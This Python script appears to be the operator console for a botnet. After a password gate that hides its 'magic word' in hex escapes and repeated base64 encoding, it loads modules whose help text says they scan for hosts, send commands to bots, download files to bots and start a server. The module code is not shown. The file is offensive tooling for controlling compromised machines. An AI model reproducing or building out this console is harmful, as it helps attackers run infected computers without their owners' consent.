#!/usr/bin/env python3
#Wrote long lines of code...No comments 
import base64
import os,sys
import random,importlib
from modules import printer
from time import sleep
import getpass

print(printer.color_blue("▗    ▗▖ ▗▄▄")+printer.color_red("      ▗▖  ▗▄  ▗▄ ▗▄▄▖ ▄▄  ▄▄ "))
print(printer.color_blue("▐    ▐▌ ▐  ▌")+printer.color_red("     ▐▌ ▗▘ ▘▗▘ ▘▐   ▐▘ ▘▐▘ ▘"))
print(printer.color_blue("▐    ▌▐ ▐▄▄▘")+printer.color_red("     ▌▐ ▐   ▐   ▐▄▄▖▝▙▄ ▝▙▄ "))
print(printer.color_blue("▐    ▙▟ ▐  ▌")+printer.color_red("     ▙▟ ▐   ▐   ▐     ▝▌  ▝▌"))
print(printer.color_blue("▐▄▄▖▐  ▌▐▄▄▘")+printer.color_red("    ▐  ▌ ▚▄▘ ▚▄▘▐▄▄▖▝▄▟▘▝▄▟▘"))
print()
pa="\x6a\x75\x73\x74\x5f"
printer.print_error(printer.color_red("ｙｏｕ  ｄｉｄｎｔ  ｓａｙ  ｔｈｅ  ｍａｇｉｃ  ｗｏｒｄ"))
sleep(1)
banner="""
+-+-+-+-+-+ +-+-+-+-+ +-+-+-+-+-+-+-+-+
|M|a|g|i|c| |W|o|r|d| |R|e|q|u|i|r|e|d|
+-+-+-+-+-+ +-+-+-+-+ +-+-+-+-+-+-+-+-+
"""
sleep(1)
print(banner)
banner="""Ｅｎｔｅｒ  Ｔｈｅ  Ｍａｇｉｃ  ｗｏｒｄ"""
ss="\x72\x65\x76\x65\x72"
sleep(1)
print(printer.color_blue(banner))
key=random.randint(1,7)
passwd=getpass.getpass()
hpasswd=[]
wo="\x73\x65\x5f\x69\x74"
username = [0x69, 0x74, 0x73, 0x20, 0x6e, 0x6f, 0x74, 0x20, 0x74, 0x68, 0x61, 0x74, 0x20, 0x65, 0x61, 0x73, 0x79]
variable=[]
rd=pa+ss+wo
variable.insert(0,base64.b64encode(bytes(rd,encoding="utf-8")).decode())
for i in range(key):
    hvariable=variable.__getitem__(0)
    variable.__delitem__(0)
    variable.insert(0,base64.b64encode(bytes(hvariable,encoding="utf-8")).decode())

hpasswd.insert(0,base64.b64encode(bytes(passwd,encoding="utf-8")).decode())
for i in range(key):
    hashedpasswd=hpasswd.__getitem__(0)
    hpasswd.__delitem__(0)
    hpasswd.insert(0,base64.b64encode(bytes(hashedpasswd,encoding="utf-8")).decode())

def prompt(string):
    return input("\001\033[4m\002%s\001\033[0m\002 >"%string)

class lab():
    def command_show():
        print("""available modules
          scanner -- use this module to scan for hosts if Db is empty
          shell   -- this module sends commands to bots
          downloader -- use this module to download files to bot
          server     -- use this module starts a server in xterm""")

    def command_help():
        print("""This is the help menu
          available commands:::
    help    -       show the help menu
    use     -       use a module
    show    -       show available modules
    exit    -       exit this cosole""")
class shel():
     def command_help():
         print("""Available commands
               run      -      runs the module""")       
class scana():
    def command_help():
        print("""available commands are
              run       -       runs the module""")

class downloada():
    def command_help():
        print("""Available Commands
              run       -       runs the module""")
class serva():
    def command_help():
        print("""Available Commands
              run       -       runs the module""")
def command_use(module_name,module,shell_options):
    module_path = ".".join(("modules", module_name))
    module=importlib.import_module(module_path)
    if(module_name=='scanner'):
        shell_options=scana
        module_name="("+printer.color_red(module_name)+")"
    elif(module_name=='downloader'):
        shell_options=downloada
        module_name="("+printer.color_blue(module_name)+")"
    elif(module_name=='shell'):
        module_name="("+printer.color_cyan(module_name)+")"
        shell_options=shel
    elif(module_name=='server'):
        module_name="("+printer.color_cyan(module_name)+")"
        shell_options=serva
    start(module_name,module,shell_options)

def parse_line(line):
        """ Split line into command and argument.

        :param line: line to parse
        :return: (command, argument, named_arguments)
        """
        kwargs = dict()
        command, _, arg = line.strip().partition(" ")
        args = arg.strip().split()
        for word in args:
            if '=' in word:
                (key, value) = word.split('=', 1)
                kwargs[key.lower()] = value
                arg = arg.replace(word, '')
        return command,' '.join(arg.split()), kwargs
def start(module_name, module,shell_options):
    while True:
        command,args,kwargs=parse_line(prompt(module_name))
        try:
            if(command=='exit'):
                print("\nExiting Cleanly")
                sys.exit(0)
            elif(command=='help'):
                shell_options.command_help()
            elif(command=='use'):
                command_use(args,module,shell_options)
            elif(command=='run'):
                module.main()
            elif(command=='show'):
                shell_options.command_show()
            elif(command=='back'):
                start("Lab",lab,lab)
        except ModuleNotFoundError as e:
            print(e)
        except AttributeError as e:
            print("command not found",e)


def main():
        if (variable == hpasswd):
            start("Lab",lab,lab)
        else:
            printer.print_error("Wrong password Try Harder")

if __name__ == '__main__':
    main()
    
    

    


